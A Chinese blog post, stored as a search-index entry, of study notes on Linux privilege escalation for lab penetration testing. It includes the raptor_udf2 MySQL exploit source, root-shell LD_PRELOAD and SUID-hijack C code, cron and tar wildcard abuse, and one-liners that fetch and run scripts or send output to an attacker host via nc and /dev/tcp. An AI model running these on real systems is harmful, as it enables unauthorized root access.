[{"title":"Privilege Escalation","url":"/2023/05/23/pe_note/","content":"\n\n\nPrivilege Escalation整理自B站up红队笔记的提权精讲\nLinux Priv Esca最常用：\n\nugo\nsuid sgid\nCapabilities\nAppArmor Selinux\nACL\n\n用的也比较多的：\n\nGrsecurity\n\nPax\n\nExecShield\n\nASLR\n\nTOMOYO Linux\n\nSMACK\n\nYama\n\nCGroups\n\nLinux Namespaces\n\nStackGuard\n\nProplice\n\nseccomp\n\nPtrace\n\ncapsicum\n\nMprotect\n\nchroot\n\nfirejail\n\n\n手动枚举用户信息：\n\nwhoami\nid\nw&#x2F;who 查看其他登录用户\nlast 最近登录用户以及一些操作\n\n内核版本信息：\n\nuname -a\nlsb_release -a 更多信息\ncat &#x2F;proc&#x2F;version 进程信息查看版本\ncat &#x2F;etc&#x2F;issue\nhostnamectl\n\n网络信息：\n\nip a\nifconfig 老机子\nip route 查看路由表信息\nip neigh 查看网络邻居\narp -a\n\n用户权限：\n\nsudo -l\ngetcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null\nhistory 查看历史命令\ncat &#x2F;etc&#x2F;passwd\ncat cat &#x2F;etc&#x2F;shadow\ncat &#x2F;etc&#x2F;crontab\necho $PATH\nenv 查看整体环境\nps -ef  entire full list\nps axjf  x-没有连接到终端的进程 j-查看进程树 a-all\nps aux u-显示启动进程的用户\ntop 查看实时更新的进程信息 top -n 1 只刷一次\nnetstat -a \nnetstat -l 显示正在监听的\nfind &#x2F; -type f -perm -04000 2&gt;&#x2F;dev&#x2F;null  或者（find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null）\nwhich 查询可执行文件\ncat &#x2F;etc&#x2F;fstab 查看未挂载磁盘（系统运维备份常临时挂载一块磁盘，当使用时再挂载，不使用时就卸掉）\n\n自动枚举\n大招：linpeas \n\n推荐：curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh  通过管道符执行，不保留文件到本地。\n将扫描结果传回本地查看 curl &lt;serverIP&gt;/linpeas.sh | sh | nc &lt;kaliIP&gt; &lt;port&gt;  kali: nc -lvnp &lt;port&gt; | tee name.txt tee 既又在标准输出中显示，又保存到txt文件中。txt文件可以用less -r 查看。\n靶机没有curl。kali：sudo nc -lvnp &lt;port&gt; &lt; linpeas.sh victim:cat &lt; /dev/tcp/&lt;kaliIP&gt;/&lt;port&gt; | sh \n\n\nlinEnum\n\nLSE\n\nLES\n\nlinuxprivchecker.py\n\nunix-privsec-check\n\n\nTrickshell的稳定python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;stty raw -echo #raw 格式输出并关闭echo导致的命令显示两次export TERM=xterm-color\n\nrlwrap nc -lvnp 443用readlinewrap将我们的反弹shell包裹起来，防止上下翻历史记录时出现问题。\n常用方法bash version\nver&lt;4.2存在漏洞可以利用：可以在bash中定义函数并用路径组合做文件名。\nver&lt;4.4存在漏洞可以利用：环境变量插入。\n\nMySQL udfMySQL user defined function.\n提权条件\n有mysql账号，且有增删改查权限。最好有mysql root账号。\n\nsecure_file_priv 最好要为空，或者其指定目录能够利用。（该属性限定Load data、select into outfile、load_file()等操作）。（通过show variables like &#39;%secure_file_priv%&#39;查看）\n\n\n利用主要操作：写入’plugin’中。（show variables like &#39;%plugin%&#39;查到的目录）\n其他步骤在exp中有。\n/* * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $ * * raptor_udf2.c - dynamic library for do_system() MySQL UDF * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; * * This is an helper dynamic library for local privilege escalation through * MySQL run with root privileges (very bad idea!), slightly modified to work  * with newer versions of the open-source database. Tested on MySQL 4.1.14. * * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c * * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes * for the security vulnerabilities in the handling of User Defined Functions * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further * details, please refer to: * * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html * http://www.wisec.it/vulns.php?page=4 * http://www.wisec.it/vulns.php?page=5 * http://www.wisec.it/vulns.php?page=6 * * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol  * that corresponds to the main xxx() function. These auxiliary symbols  * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and  * xxx_add() functions&quot;. -- User Defined Functions Security Precautions  * * Usage: * $ id * uid=500(raptor) gid=500(raptor) groups=500(raptor) * $ gcc -g -c raptor_udf2.c * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc * $ mysql -u root -p * Enter password: * [...] * mysql&gt; use mysql; * mysql&gt; create table foo(line blob); * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;)); * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;; * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;; * mysql&gt; select * from mysql.func; * +-----------+-----+----------------+----------+ * | name      | ret | dl             | type     | * +-----------+-----+----------------+----------+ * | do_system |   2 | raptor_udf2.so | function | * +-----------+-----+----------------+----------+ * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;); * mysql&gt; \\! sh * sh-2.05b$ cat /tmp/out * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm) * [...] * * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys * */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;typedef struct st_udf_args &#123;\tunsigned int\t\targ_count;\t// number of arguments\tenum Item_result\t*arg_type;\t// pointer to item_result\tchar \t\t\t**args;\t\t// pointer to arguments\tunsigned long\t\t*lengths;\t// length of string args\tchar\t\t\t*maybe_null;\t// 1 for maybe_null args&#125; UDF_ARGS;typedef struct st_udf_init &#123;\tchar\t\t\tmaybe_null;\t// 1 if func can return NULL\tunsigned int\t\tdecimals;\t// for real functions\tunsigned long \t\tmax_length;\t// for string functions\tchar\t\t\t*ptr;\t\t// free ptr for func data\tchar\t\t\tconst_item;\t// 0 if result is constant&#125; UDF_INIT;int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)&#123;\tif (args-&gt;arg_count != 1)\t\treturn(0);\tsystem(args-&gt;args[0]);\treturn(0);&#125;char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)&#123;\treturn(0);&#125;// milw0rm.com [2006-02-20]\n\n&#x2F;etc&#x2F;shadow什么时候用：手动枚举发现可读写，历史命令发现当前账号进行过操作。\n\n可读：用john破解\n可写：直接写入(使用mkpasswd -m sha-512 生成对应格式的hash值填入)\n\n&#x2F;etc&#x2F;passwd可写：openssl passwd &lt;passwd&gt;\nsudo 环境变量提权sudo -l发现存在环境变量env_keep+=LD_PRELOADS(LD&#x3D;link dynamic动态链接库)\n/* shell.c /* /* -fPIC place indepedent code/* 还需要以root权限执行一个命令（随便）随后就能在命令执行前预先执行动态链接库生成新/* 的root bash实现提权/* gcc -fPIC -shared -o shell.so shell.c -nostartfiles/* sudo LD_PRELOAD=/tmp/shell.so &lt;rootcommand&gt;*/#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt; //数据类型库#include &lt;stdlib.h&gt;void_init()&#123;    unsetenv(&quot;LD_PRELOAD&quot;); //执行一次就卸掉链接库    setgid(0);    setuid(0);    system(&quot;/bin/bash&quot;);    &#125;\n\n自动任务\n自动任务文件可写\ncat /etc/crontab\nls -la /etc | grep cron*\n\n环境变量路径可写且自动任务相对路径\n可写入crontab中$PATH变量中较前的路径。\n如果自动任务不是绝对路径，我们可以在较前的路径构造同名文件，实现劫持自动任务执行提权。\n#!/bin/bashcp /bin/bash /tmp/rootbashchmod +xs /tmp/rootbash\n\n自动任务通配符提权\n如果存在使用tar &lt;target&gt; *自动打包的自动任务\n我们可以通过--checkpoint-action利用\ntouch &lt;tar target&gt;/--checkpoint=1touch &lt;tar target&gt;/--checkpoint-action=exec=shell.elf\n\nSUIDfind / -type f -perm -u=s -ls 2&gt;/dev/null\n发现不常见的suid文件，我们可以使用strings查看其中字符串，strace以便后面利用。\n可执行文件直接gtfobins\n共享库注入提权so文件\n使用strings查看suid文件中可识别字符串发现使用到了so库文件\n使用strace追踪，使用2&gt;&amp;1将错误信息重定向到标准输出\n看他需要什么共享库，我们给他写一个\n/* lib.c /* gcc -fPIC -shared -o lib.so lib.c*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static void inject() __attribute__((constructor));void inject()&#123;    setgid(0);    setuid(0);    system(&quot;/bin/bash -p&quot;);    &#125;\n\n环境变量利用用strings查看suid文件时时发现其中使用相对路径而非绝对路径。\n直接起一个一样的名字给他劫持掉。\n/* sameName.c /* gcc -o sameName sameName.c/* export PATH=.:$PATH*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main()&#123;    setgid(0);    setuid(0);    system(&quot;/bin/bash -p&quot;);    &#125;\n\nSUID-shell 功能提权\nbash --version小于4.2\nfunction /usr/sbin/service &#123; /bin/bash -p; &#125;export -f /usr/sbin/service //导出函数以劫持// 此处执行suid文件\n\nbash --version小于4.4\n# env 设置环境变量# -i 忽略现有的环境变量 # SHELLOPTS=xtrace用于命令执行前将其打印并插入其他语句# PS4 指定提示符env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#x27; &lt;any file set suid&gt;\n\n密码和密钥历史\n用history查看历史记录中是否遗留着密码\ncat ~/.*history | less用less列出当前用户家目录下所有与history相关的文件\n如果viminfo可以查看， 里面可能存在编辑时留下的密钥信息\n查看各种vpn配置文件(.ovpn)，网页配置文件(wp-config.php)等\n根目录下.ssh文件夹中可能存在私钥\n\nNFS提权NFS &#x3D; Network File System 常用于网络上文件共享。NFS即可用于获取初步立足点，也可用于提权。信息收集时要注意（一般绑在RPC端口上）。\n\ncat /etc/exports 查看NFS具体配置。如果有no_root_squash选项，很可能可以用于提权。\n\n在攻击机上挂载一下\nmkdir /tmp/nfsmount -o rw,vers=3 &lt;nfsip:/tmp&gt; /tmp/nfs #&lt;nfsip:/tmp&gt;在配置文件中得来cd /tmp/nfs su# 以root身份向其中插入我们的reverse shellmsfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf\n\n在靶机中执行即可\n\n\n内核提权必须提一嘴，内核提权不太稳定，很容易搞崩机子，使用前要三思。此外，内核提权和抽奖挺像，要有耐心，选择有效的exp最关键。没有注释的exp慎用。\ndirtyCow不是很稳定。\nLinux Kernal 2.6有一个著名的内核提权漏洞UDEV。\ndoas less + vi提权\nfind / -perm -u=s -type f 2&gt;/dev/null\n在openBSD等一部分系统中，会用到doas作为特权操作，如果当前用户有操作doas的权限，可以考虑提权。\ncat /etc/doas.conf 查看不需要密码执行的doas操作。\n如果可以使用less，那我们在less中可以按v进入vi编辑模式以root权限进行文件操作。\n在vi模式中:!sh可以起一个新的shell，doas root则是root shell。\n\n利用MOTD机制提权 motd &#x3D; message of the day\n\ncd /etc/update-motd.d/ ; ls -la\ncat /etc/00-header\n如果可编辑则写入反弹shell或者其他提权语句都可。\n\n可预测PRNG暴力破解SSH提权prng &#x3D; pseudo random number generator\n如果拿到了ssh公钥，可以考虑使用伪随机数生成器暴力碰撞破解。\n可以在searchsploit中查找prng但是要注意openssl版本。\n下载下来公私钥库后 直接选择拿到公钥的一部分 grep -lr 递归列举文件搜索，找到对应的公私钥对。\n","categories":["Pentest"],"tags":["pe_notes"]}]